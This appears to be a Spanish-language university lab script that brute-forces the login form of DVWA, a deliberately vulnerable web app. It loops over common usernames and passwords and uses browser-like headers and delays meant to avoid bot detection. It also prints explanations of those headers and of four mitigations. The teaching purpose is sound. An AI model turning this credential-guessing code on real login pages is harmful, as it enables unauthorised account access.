#!/usr/bin/env python3
"""
Script de fuerza bruta para DVWA - Contexto educativo/investigación
Desarrollado para el Laboratorio 2 - Sección 4

Este script demuestra técnicas de ataque de fuerza bruta contra formularios web
utilizando la librería requests de Python. Está diseñado específicamente para
interactuar con DVWA (Damn Vulnerable Web App) en un entorno controlado.

Uso: python3 brute_force_script.py
"""

import requests
import time
from itertools import product
import sys

class DVWABruteForcer:
    """
    Clase para realizar ataques de fuerza bruta contra DVWA
    """
    
    def __init__(self, base_url="http://localhost", session_cookie=None):
        """
        Inicializa el atacante de fuerza bruta
        
        Args:
            base_url (str): URL base de DVWA (default: http://localhost)
            session_cookie (str): Cookie de sesión DVWA si está disponible
        """
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.login_url = f"{self.base_url}/vulnerabilities/brute/"
        
        # Headers HTTP importantes para el ataque de fuerza bruta
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        
        if session_cookie:
            self.session.headers['Cookie'] = session_cookie
    
    def attempt_login(self, username, password):
        """
        Intenta realizar login con credenciales específicas
        
        Args:
            username (str): Nombre de usuario a probar
            password (str): Contraseña a probar
            
        Returns:
            tuple: (bool success, str response_text)
        """
        # Parámetros para el formulario de DVWA brute force
        data = {
            'username': username,
            'password': password,
            'Login': 'Login'
        }
        
        try:
            # Realizar petición POST al formulario
            response = self.session.get(self.login_url, params=data)
            
            # Verificar si el login fue exitoso
            # DVWA muestra "Welcome to the password protected area" para login exitoso
            # y "Username and/or password incorrect" para fallo
            if "Welcome to the password protected area" in response.text:
                return True, response.text
            elif "Username and/or password incorrect" in response.text:
                return False, response.text
            else:
                # Respuesta inesperada
                return False, f"Respuesta inesperada: {response.status_code}"
                
        except requests.RequestException as e:
            return False, f"Error de conexión: {str(e)}"
    
    def brute_force_attack(self, usernames, passwords, delay=0.5):
        """
        Ejecuta el ataque de fuerza bruta
        
        Args:
            usernames (list): Lista de nombres de usuario a probar
            passwords (list): Lista de contraseñas a probar
            delay (float): Tiempo de espera entre intentos (segundos)
            
        Returns:
            list: Lista de tuplas (username, password) válidas encontradas
        """
        valid_credentials = []
        total_attempts = len(usernames) * len(passwords)
        current_attempt = 0
        
        print(f"[INFO] Iniciando ataque de fuerza bruta...")
        print(f"[INFO] Usuarios: {len(usernames)}, Contraseñas: {len(passwords)}")
        print(f"[INFO] Total de combinaciones a probar: {total_attempts}")
        print(f"[INFO] URL objetivo: {self.login_url}")
        print(f"[INFO] Delay entre intentos: {delay}s")
        print("-" * 60)
        
        for username in usernames:
            for password in passwords:
                current_attempt += 1
                print(f"[{current_attempt:04d}/{total_attempts:04d}] Probando {username}:{password}")
                
                success, response = self.attempt_login(username, password)
                
                if success:
                    print(f"[SUCCESS] ✓ Credenciales válidas encontradas: {username}:{password}")
                    valid_credentials.append((username, password))
                else:
                    print(f"[FAIL] ✗ Credenciales inválidas: {username}:{password}")
                
                # Delay para evitar detección y no sobrecargar el servidor
                if delay > 0:
                    time.sleep(delay)
        
        return valid_credentials

def print_http_headers_explanation():
    """
    Imprime explicación sobre las cabeceras HTTP utilizadas en el ataque
    """
    print("\n" + "="*80)
    print("EXPLICACIÓN DE CABECERAS HTTP UTILIZADAS EN EL ATAQUE DE FUERZA BRUTA")
    print("="*80)
    
    headers_info = {
        "User-Agent": {
            "valor": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36...",
            "proposito": "Identifica el navegador/cliente que realiza la petición",
            "importancia": "Simula un navegador real para evitar detección automática de bots"
        },
        "Accept": {
            "valor": "text/html,application/xhtml+xml,application/xml;q=0.9...",
            "proposito": "Especifica qué tipos de contenido acepta el cliente",
            "importancia": "Hace que las peticiones parezcan más legítimas"
        },
        "Accept-Language": {
            "valor": "en-US,en;q=0.5",
            "proposito": "Indica los idiomas preferidos por el cliente",
            "importancia": "Añade realismo a las peticiones HTTP"
        },
        "Connection": {
            "valor": "keep-alive",
            "proposito": "Mantiene la conexión TCP abierta para múltiples peticiones",
            "importancia": "Mejora el rendimiento del ataque al reutilizar conexiones"
        },
        "Cookie": {
            "valor": "PHPSESSID=...; security=low",
            "proposito": "Mantiene la sesión y configuración de seguridad en DVWA",
            "importancia": "CRÍTICA - Sin cookies válidas, el ataque no funcionará"
        }
    }
    
    for header, info in headers_info.items():
        print(f"\n{header}:")
        print(f"  Valor: {info['valor']}")
        print(f"  Propósito: {info['proposito']}")
        print(f"  Importancia: {info['importancia']}")

def print_mitigation_methods():
    """
    Imprime información sobre métodos de mitigación de ataques de fuerza bruta
    """
    print("\n" + "="*80)
    print("4 MÉTODOS COMUNES PARA PREVENIR/MITIGAR ATAQUES DE FUERZA BRUTA")
    print("="*80)
    
    methods = {
        "1. RATE LIMITING Y ACCOUNT LOCKOUT": {
            "funcionamiento": [
                "Limita el número de intentos de login por IP/usuario en un período de tiempo",
                "Bloquea temporalmente cuentas después de X intentos fallidos",
                "Incrementa progresivamente el tiempo de bloqueo con cada intento fallido"
            ],
            "escenarios_eficaces": [
                "Aplicaciones web con autenticación de usuarios",
                "APIs que requieren autenticación",
                "Sistemas con gran volumen de usuarios legítimos",
                "Especialmente eficaz contra ataques automatizados de alta frecuencia"
            ],
            "ventajas": "Fácil de implementar, no afecta la experiencia del usuario legítimo",
            "desventajas": "Puede ser evadido con IP distribuidas o ataques lentos"
        },
        
        "2. CAPTCHA (COMPLETELY AUTOMATED PUBLIC TURING TEST)": {
            "funcionamiento": [
                "Presenta desafíos que son fáciles para humanos pero difíciles para bots",
                "Se activa después de X intentos fallidos de login",
                "Incluye reconocimiento de imágenes, texto distorsionado, o reCAPTCHA"
            ],
            "escenarios_eficaces": [
                "Sitios web públicos con registro de usuarios",
                "Formularios de contacto y comentarios",
                "E-commerce y plataformas de servicios",
                "Especialmente útil cuando se detecta comportamiento automatizado"
            ],
            "ventajas": "Muy efectivo contra bots automatizados",
            "desventajas": "Puede degradar la experiencia del usuario, algunos CAPTCHAs pueden ser resueltos por IA"
        },
        
        "3. MULTI-FACTOR AUTHENTICATION (MFA/2FA)": {
            "funcionamiento": [
                "Requiere múltiples formas de verificación: algo que sabes (contraseña) + algo que tienes (token/SMS)",
                "Puede incluir códigos SMS, aplicaciones autenticadoras, tokens hardware",
                "Se puede requerir siempre o solo cuando se detecta actividad sospechosa"
            ],
            "escenarios_eficaces": [
                "Sistemas bancarios y financieros",
                "Aplicaciones empresariales con datos sensibles",
                "Cuentas administrativas y privilegiadas",
                "Cualquier sistema donde la seguridad es crítica"
            ],
            "ventajas": "Incluso si se compromete la contraseña, el atacante necesita el segundo factor",
            "desventajas": "Mayor complejidad para el usuario, dependencia de dispositivos externos"
        },
        
        "4. MONITOREO Y BLOQUEO BASADO EN IP/GEOLOCALIZACIÓN": {
            "funcionamiento": [
                "Analiza patrones de tráfico para identificar IPs sospechosas",
                "Bloquea rangos de IP o países específicos según políticas",
                "Usa listas negras dinámicas y sistemas de reputación de IP",
                "Implementa análisis de comportamiento y machine learning"
            ],
            "escenarios_eficaces": [
                "Aplicaciones con audiencia geográfica específica",
                "Sistemas que pueden tolerar falsos positivos ocasionales",
                "Infraestructuras con WAF (Web Application Firewall)",
                "Entornos donde se puede mantener listas actualizadas de amenazas"
            ],
            "ventajas": "Protección proactiva, puede bloquear ataques antes de que lleguen a la aplicación",
            "desventajas": "Falsos positivos con usuarios legítimos, puede ser evadido con proxies/VPN"
        }
    }
    
    for method, details in methods.items():
        print(f"\n{method}")
        print("-" * len(method))
        
        print("\nFuncionamiento:")
        for item in details["funcionamiento"]:
            print(f"  • {item}")
        
        print("\nEscenarios más eficaces:")
        for item in details["escenarios_eficaces"]:
            print(f"  • {item}")
        
        print(f"\nVentajas: {details['ventajas']}")
        print(f"Desventajas: {details['desventajas']}")
        print()

def main():
    """
    Función principal del script
    """
    print("="*80)
    print("SCRIPT DE FUERZA BRUTA - DVWA")
    print("Laboratorio 2 - Sección 4")
    print("Contexto: Educativo/Investigación en Seguridad")
    print("="*80)
    
    # Mostrar explicación de cabeceras HTTP
    print_http_headers_explanation()
    
    # Mostrar métodos de mitigación
    print_mitigation_methods()
    
    print("\n" + "="*80)
    print("EJECUCIÓN DEL ATAQUE DE FUERZA BRUTA")
    print("="*80)
    
    # Configuración del objetivo
    base_url = input("Ingrese la URL base de DVWA (default: http://localhost): ").strip()
    if not base_url:
        base_url = "http://localhost"
    
    # Lista de usuarios comunes a probar
    usernames = [
        'admin', 'administrator', 'root', 'user', 'test',
        'guest', 'demo', 'dvwa', 'smith', 'john'
    ]
    
    # Lista de contraseñas comunes a probar
    passwords = [
        'password', '123456', 'admin', 'root', 'test',
        'guest', 'demo', '', 'password123', 'qwerty',
        'letmein', 'welcome', 'monkey', 'dragon'
    ]
    
    print(f"\nUsuarios a probar: {', '.join(usernames)}")
    print(f"Contraseñas a probar: {', '.join(passwords)}")
    
    # Crear instancia del atacante
    brute_forcer = DVWABruteForcer(base_url)
    
    # Ejecutar ataque
    valid_creds = brute_forcer.brute_force_attack(usernames, passwords, delay=0.5)
    
    # Mostrar resultados
    print("\n" + "="*80)
    print("RESULTADOS DEL ATAQUE")
    print("="*80)
    
    if valid_creds:
        print(f"[SUCCESS] Se encontraron {len(valid_creds)} combinaciones válidas:")
        for i, (username, password) in enumerate(valid_creds, 1):
            print(f"  {i}. Usuario: '{username}' | Contraseña: '{password}'")
    else:
        print("[INFO] No se encontraron credenciales válidas con las listas utilizadas.")
        print("Esto puede deberse a:")
        print("  • DVWA no está ejecutándose en la URL especificada")
        print("  • Se requiere una cookie de sesión válida")
        print("  • Las credenciales no están en las listas utilizadas")
        print("  • El nivel de seguridad de DVWA está configurado en 'high' o 'impossible'")
    
    print("\n[INFO] Ataque completado.")
    print("\nNOTA: Este script es solo para fines educativos y de investigación.")
    print("Use únicamente en sistemas de prueba autorizados como DVWA.")

if __name__ == "__main__":
    main()